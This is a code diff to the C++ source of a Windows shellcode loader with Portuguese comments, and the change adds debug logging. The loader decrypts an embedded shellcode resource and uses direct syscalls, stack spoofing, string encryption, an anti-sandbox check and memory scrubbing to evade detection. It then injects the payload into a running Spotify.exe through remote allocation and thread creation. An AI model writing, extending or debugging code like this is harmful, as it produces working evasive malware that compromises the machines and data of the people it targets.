@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <vector>
 #include <string>
+#include <cstdio>
 #include "header.h"
 #include "evasion.h"
 #include "strenc.h"
@@ -8,6 +9,12 @@
 #include "resource.h"
 #include "sckey.h"
 
+// Debug macros. Toda string de debug passa por ENC(literal) no call site
+// pelo macro -> nao vai pra .rdata plaintext.
+#define DBG(msg)        printf("[+] %s\n", ENC(msg))
+#define DBGF(fmt, ...)  printf("[+] "), printf(ENC(fmt), __VA_ARGS__), printf("\n")
+#define ERR(msg)        printf("[!] ERROR: %s\n", ENC(msg))
+#define ERRF(fmt, ...)  printf("[!] ERROR: "), printf(ENC(fmt), __VA_ARGS__), printf("\n")
 
 extern "C" SYSCALL_ENTRY g_SyscallTable[SYSCALL_TABLE_SIZE] = { 0 };
 
@@ -102,8 +109,10 @@ PVOID FindSyscallAddress()
 
 BOOL InitializeSyscalls()
 {
+    DBG("InitializeSyscalls: start");
     PVOID syscallAddr = FindSyscallAddress();
-    if (!syscallAddr) return FALSE;
+    if (!syscallAddr) { ERR("InitializeSyscalls: FindSyscallAddress failed"); return FALSE; }
+    DBGF("InitializeSyscalls: syscall addr @ 0x%p", syscallAddr);
 
     // decrypta cada nome num buffer local, usa, zera. nenhum
     // cleartext persiste em memoria apos a chamada de GetSSN.
@@ -112,11 +121,17 @@ BOOL InitializeSyscalls()
     #define RESOLVE_ONE(idx, literal) do { \
         ENC_BUF(nameBuf, literal); \
         DWORD _ssn = GetSSN(nameBuf); \
-        for (size_t _k = 0; _k < sizeof(nameBuf); ++_k) \
-            ((volatile char*)nameBuf)[_k] = 0; \
-        if (_ssn == (DWORD)-1) return FALSE; \
+        if (_ssn == (DWORD)-1) { \
+            ERRF("InitializeSyscalls: resolve fail idx=%d name=%s", (idx), nameBuf); \
+            for (size_t _k = 0; _k < sizeof(nameBuf); ++_k) \
+                ((volatile char*)nameBuf)[_k] = 0; \
+            return FALSE; \
+        } \
         g_SyscallTable[idx].ssn            = _ssn; \
         g_SyscallTable[idx].syscallAddress = syscallAddr; \
+        DBGF("InitializeSyscalls: [%d] %s -> SSN 0x%X", (idx), nameBuf, _ssn); \
+        for (size_t _k = 0; _k < sizeof(nameBuf); ++_k) \
+            ((volatile char*)nameBuf)[_k] = 0; \
     } while (0)
 
     RESOLVE_ONE(0,  "NtAllocateVirtualMemory");
@@ -135,19 +150,22 @@ BOOL InitializeSyscalls()
 
     #undef RESOLVE_ONE
     ScrubEncTLS();
+    DBG("InitializeSyscalls: all resolved OK");
     return TRUE;
 }
 
 void LoadShellcodeFromBytes(std::vector<uint8_t>& sc)
 {
+    DBG("LoadShellcode: start");
     HMODULE self = GetModuleHandleW(nullptr);
     HRSRC   r    = FindResourceW(self, MAKEINTRESOURCEW(IDR_SHELLCODE), RT_RCDATA);
-    if (!r) return;
+    if (!r) { ERR("LoadShellcode: FindResourceW failed - IDR_SHELLCODE nao achado"); return; }
     DWORD   sz = SizeofResource(self, r);
     HGLOBAL g  = LoadResource(self, r);
-    if (!g || !sz) return;
+    if (!g || !sz) { ERRF("LoadShellcode: LoadResource fail g=%p sz=%u", g, sz); return; }
     const uint8_t* p = (const uint8_t*)LockResource(g);
-    if (!p) return;
+    if (!p) { ERR("LoadShellcode: LockResource failed"); return; }
+    DBGF("LoadShellcode: resource size=%u bytes @ 0x%p", sz, p);
 
     // Reverte XOR com stream de 16 bytes + rol8 do pack_bin.
     sc.resize(sz);
@@ -162,10 +180,13 @@ void LoadShellcodeFromBytes(std::vector<uint8_t>& sc)
         v = (uint8_t)((v >> 3) | (v << 5));
         sc[i] = v ^ stream[i & 15];
     }
+    DBGF("LoadShellcode: decrypted %zu bytes, first bytes = %02X %02X %02X %02X %02X",
+         sc.size(), sc[0], sc[1], sc[2], sc[3], sc[4]);
 }
 
 DWORD FindProcessByName(const wchar_t* processName)
 {
+    DBGF("FindProcess: looking for %S", processName);
     SIZE_T   bufSize = 0x10000;
     PVOID    buf = nullptr;
     NTSTATUS st;
@@ -188,7 +209,7 @@ DWORD FindProcessByName(const wchar_t* processName)
         SIZE_T allocSize = bufSize;
         st = SysNtAllocateVirtualMemory(GetCurrentProcess(), &buf, 0, &allocSize,
             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!NT_SUCCESS(st)) return 0;
+        if (!NT_SUCCESS(st)) { ERRF("FindProcess: alloc fail status=0x%X", st); return 0; }
 
         ULONG returnLen = 0;
         st = SysNtQuerySystemInformation(SystemProcessInformation, buf,
@@ -196,15 +217,19 @@ DWORD FindProcessByName(const wchar_t* processName)
 
         if (st == STATUS_INFO_LENGTH_MISMATCH) {
             bufSize = (returnLen > bufSize) ? (returnLen + 0x1000) : (bufSize * 2);
+            DBGF("FindProcess: buffer too small, retrying with %zu bytes (attempt %d)",
+                 bufSize, attempts);
         }
 
         if (attempts > 10) {
+            ERR("FindProcess: too many attempts");
             freeBuf();
             return 0;
         }
     } while (st == STATUS_INFO_LENGTH_MISMATCH);
 
     if (!NT_SUCCESS(st)) {
+        ERRF("FindProcess: NtQuerySystemInformation final status=0x%X", st);
         freeBuf();
         return 0;
     }
@@ -329,18 +354,26 @@ HANDLE openThreadViaSyscall(DWORD threadId)
 
 bool injectViaExistingThread(std::vector<uint8_t>& sc, HANDLE hProcess, HANDLE hExistingThread)
 {
+    DBGF("inject: enter hProcess=0x%p hThread=0x%p sc.size=%zu",
+         hProcess, hExistingThread, sc.size());
+
     SIZE_T scSz = ((sc.size() + 0xFFF) & ~0xFFF);
     if (scSz < 0x1000) scSz = 0x1000;
+    DBGF("inject: aligned scSz=%zu", (size_t)scSz);
 
     HANDLE hScSec = NULL;
     PVOID  scBase = SectionAllocRemote(hProcess, scSz, PAGE_EXECUTE_READWRITE, &hScSec);
+    DBGF("inject: SectionAllocRemote scBase=0x%p hScSec=0x%p", scBase, hScSec);
 
     if (!scBase)
     {
+        DBG("inject: section failed, fallback NtAllocateVirtualMemory");
         NTSTATUS st = SysNtAllocateVirtualMemory(hProcess, &scBase, 0, &scSz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (!NT_SUCCESS(st)) {
+            ERRF("inject: NtAllocateVirtualMemory fail status=0x%X", st);
             return false;
         }
+        DBGF("inject: private alloc @ 0x%p", scBase);
     }
 
     JitterDelay(10, 30);
@@ -348,79 +381,105 @@ bool injectViaExistingThread(std::vector<uint8_t>& sc, HANDLE hProcess, HANDLE h
     std::vector<uint8_t> wrapper;
     wrapper.resize(sc.size() + 16);
     memcpy(wrapper.data(), sc.data(), sc.size());
-    
+
     wrapper[sc.size()] = 0xEB;
     wrapper[sc.size() + 1] = 0xFE;
     for (size_t i = sc.size() + 2; i < wrapper.size(); i++) {
         wrapper[i] = 0x90;
     }
-    
+    DBGF("inject: wrapper preparado %zu bytes (sled EB FE no offset %zu)",
+         wrapper.size(), sc.size());
+
     SIZE_T written = 0;
     NTSTATUS st = SysNtWriteVirtualMemory(hProcess, scBase, wrapper.data(), wrapper.size(), &written);
     if (!NT_SUCCESS(st)) {
+        ERRF("inject: NtWriteVirtualMemory fail status=0x%X written=%zu", st, (size_t)written);
         return false;
     }
+    DBGF("inject: write OK, %zu bytes escritos em 0x%p", (size_t)written, scBase);
 
     JitterDelay(10, 30);
 
     HANDLE hThread = NULL;
+    DBG("inject: creating thread remote");
     NTSTATUS st2 = SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                                        hProcess, scBase, NULL, 0, 0, 0, 0, NULL);
     if (!NT_SUCCESS(st2)) {
+        ERRF("inject: NtCreateThreadEx fail status=0x%X", st2);
         return false;
     }
-    
+    DBGF("inject: thread criada hThread=0x%p, aguardando 500-1000ms", hThread);
+
     JitterDelay(500, 1000);
-    
+
     SysNtClose(hThread);
+    DBG("inject: SUCCESS");
     return true;
 }
 
 bool injectShellcode(std::vector<uint8_t>& sc, HANDLE hProcess, DWORD processId)
 {
+    DBGF("injectShellcode: pid=%u sc.size=%zu", processId, sc.size());
+
     std::vector<DWORD> threadIds;
     if (!enumerateThreadsViaSyscall(processId, threadIds)) {
+        ERR("injectShellcode: enumerateThreads failed");
         return false;
     }
+    DBGF("injectShellcode: encontradas %zu threads", threadIds.size());
 
-    if (!threadIds.empty()) {
-        HANDLE hThread = openThreadViaSyscall(threadIds[0]);
-        if (hThread) {
-            bool result = injectViaExistingThread(sc, hProcess, hThread);
-            SysNtClose(hThread);
-            if (result) return true;
-        } else {
-            for (size_t i = 1; i < threadIds.size(); i++) {
-                hThread = openThreadViaSyscall(threadIds[i]);
-                if (hThread) {
-                    bool result = injectViaExistingThread(sc, hProcess, hThread);
-                    SysNtClose(hThread);
-                    if (result) return true;
-                }
-            }
+    if (threadIds.empty()) { ERR("injectShellcode: zero threads"); return false; }
+
+    // tenta em sequencia: parar na primeira que injetar OK
+    for (size_t i = 0; i < threadIds.size(); i++) {
+        DBGF("injectShellcode: tentando tid=%u (%zu/%zu)",
+             threadIds[i], i + 1, threadIds.size());
+        HANDLE hThread = openThreadViaSyscall(threadIds[i]);
+        if (!hThread) {
+            DBGF("injectShellcode: openThread falhou tid=%u, prox", threadIds[i]);
+            continue;
         }
+        DBGF("injectShellcode: tid=%u aberto hThread=0x%p", threadIds[i], hThread);
+        bool result = injectViaExistingThread(sc, hProcess, hThread);
+        SysNtClose(hThread);
+        if (result) {
+            DBGF("injectShellcode: tid=%u SUCCESS", threadIds[i]);
+            return true;
+        }
+        DBGF("injectShellcode: tid=%u falhou, prox", threadIds[i]);
     }
 
+    ERR("injectShellcode: todas as threads falharam");
     return false;
 }
 
 BOOL ExecuteInjectionHijack(HWND hwnd)
 {
     (void)hwnd;
+    DBG("=== ExecuteInjectionHijack: START ===");
+
     // anti-sandbox: maquina real tem >= 2 processadores
     DWORD nProc = PebGetNumberOfProcessors();
-    if (nProc < 2) return FALSE;
+    DBGF("ExecuteInjection: nProc = %u", nProc);
+    if (nProc < 2) { ERR("ExecuteInjection: sandbox detect (nProc < 2)"); return FALSE; }
 
-    if (!InitializeSyscalls()) return FALSE;
-    if (!InitStackSpoofer())   return FALSE;
+    DBG("ExecuteInjection: calling InitializeSyscalls");
+    if (!InitializeSyscalls()) { ERR("ExecuteInjection: InitializeSyscalls FAIL"); return FALSE; }
 
+    DBG("ExecuteInjection: calling InitStackSpoofer");
+    if (!InitStackSpoofer())   { ERR("ExecuteInjection: InitStackSpoofer FAIL"); return FALSE; }
+
+    DBG("ExecuteInjection: calling LoadShellcodeFromBytes");
     std::vector<uint8_t> sc;
     LoadShellcodeFromBytes(sc);
-    if (sc.empty()) return FALSE;
+    if (sc.empty()) { ERR("ExecuteInjection: shellcode VAZIO"); return FALSE; }
+    DBGF("ExecuteInjection: shellcode %zu bytes carregado", sc.size());
 
+    DBG("ExecuteInjection: procurando Spotify.exe");
     DWORD pid = FindProcessByName(WENC(L"Spotify.exe"));
     ScrubEncTLS();
-    if (!pid) return FALSE;
+    if (!pid) { ERR("ExecuteInjection: Spotify.exe NAO ENCONTRADO (abre o Spotify primeiro)"); return FALSE; }
+    DBGF("ExecuteInjection: Spotify.exe PID = %u", pid);
 
     HANDLE hProcess = NULL;
     MY_CLIENT_ID cid = { 0 };
@@ -429,22 +488,31 @@ BOOL ExecuteInjectionHijack(HWND hwnd)
     MY_OBJECT_ATTRIBUTES objAttr = { 0 };
     objAttr.Length = sizeof(MY_OBJECT_ATTRIBUTES);
 
+    DBG("ExecuteInjection: NtOpenProcess");
     NTSTATUS st = SysNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
-    if (!NT_SUCCESS(st) || !hProcess) return FALSE;
+    if (!NT_SUCCESS(st) || !hProcess) {
+        ERRF("ExecuteInjection: NtOpenProcess fail status=0x%X hProcess=0x%p", st, hProcess);
+        return FALSE;
+    }
+    DBGF("ExecuteInjection: hProcess = 0x%p", hProcess);
 
+    DBG("ExecuteInjection: chamando injectShellcode");
     bool bResult = injectShellcode(sc, hProcess, pid);
+    DBGF("ExecuteInjection: injectShellcode retornou %s", bResult ? "TRUE" : "FALSE");
 
     // zera o blob do shellcode no nosso heap depois de injetado.
-    // Echo scaneia all_process_memory; sem isso o shellcode fica visivel aqui.
+    DBG("ExecuteInjection: scrub shellcode local");
     if (!sc.empty()) {
         volatile uint8_t* p = sc.data();
         for (size_t i = 0; i < sc.size(); ++i) p[i] = 0;
         std::vector<uint8_t>().swap(sc);
     }
 
+    DBG("ExecuteInjection: Sleep 2s pra observar...");
     Sleep(2000);
     SysNtClose(hProcess);
     ScrubEncTLS();
+    DBG("=== ExecuteInjectionHijack: END ===");
     return bResult;
 }
 
@@ -494,21 +562,31 @@ BOOL ExecuteInjectionHijack(HWND hwnd)
 
 int main()
 {
-    // console pra debug local. nome do titulo/separador tudo via ENC()
-    // pra sair de .rdata plaintext.
+    // console pra debug local
     AllocConsole();
     FILE* fp;
-    // nao usar ENC() aqui: tls_buf eh unico e os dois ENC() na mesma
-    // call sobrescrevem um ao outro -> CRT dispara _invalid_parameter.
-    // "CONOUT$" e "w" sao strings genericas de CRT, nao identificam nada.
+    // nao usar ENC() em args multiplos da mesma call: tls_buf eh unico e
+    // os dois ENC() sobrescrevem um ao outro -> CRT dispara
+    // _invalid_parameter. "CONOUT$"/"w" sao strings genericas do CRT.
     freopen_s(&fp, "CONOUT$", "w", stdout);
     freopen_s(&fp, "CONOUT$", "w", stderr);
+    // tira o buffer pra ver output em tempo real (nao perdemos ultima
+    // linha se Spotify crashar e levar o loader junto)
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
 
-    printf("%s", ENC("\n============\n loader\n============\n\n"));
+    printf("%s", ENC("\n========================================\n"));
+    printf("%s", ENC(" loader - debug build\n"));
+    printf("%s", ENC("========================================\n\n"));
+
+    DBG("main: start");
 
     BOOL result = ExecuteInjectionHijack(NULL);
 
-    printf("%s", ENC("press any key\n"));
+    if (result) DBG("main: SUCCESS");
+    else        ERR("main: FAIL");
+
+    printf("%s", ENC("\npress any key to exit\n"));
     getchar();
 
     return result ? 0 : 1;
